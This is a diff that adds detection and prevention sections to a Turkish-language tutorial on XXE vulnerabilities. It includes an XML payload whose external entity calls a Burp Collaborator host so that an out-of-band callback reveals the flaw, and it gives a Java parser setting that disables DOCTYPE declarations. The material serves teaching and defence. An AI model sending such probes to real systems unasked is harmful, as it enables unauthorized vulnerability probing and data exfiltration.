@@ -105,4 +105,21 @@ Sonra da web sunucusu test.dtd dosyasını almaya gider, "hacker.com" ise http r
 
 <img width="1571" height="600" alt="image" src="https://github.com/user-attachments/assets/febf27b5-4d0d-496e-91af-8a0edadde022" />
 
+## **XXE nasıl tespit edilir?**
+
+Aşağıdaki payload, bir sistemin dışarıya veri sızdırıp sızdırmadığını tespit eder. Bu şekilde kendi sunucumuza istek atıldığında dns çözümlemesi yapılıyor veya http get request'i geliyorsa xxe'nin varlığından bahsedilebilir. 
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note [<!ENTITY writer SYSTEM "http://deneme.burpcollaborator.net">]>
+<stockCheck><productId></productId><storeId>1</storeId></stockCheck>
+```
+
 ## **XXE nasıl engellenir?**
+
+XXE Zafiyetinin engellenebilmesi için de izlenmesi gereken yol dtd’nin disallow edilmesi yani müsaade edilmemesi gerekmektedir.
+
+```
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl",
+true);
+```
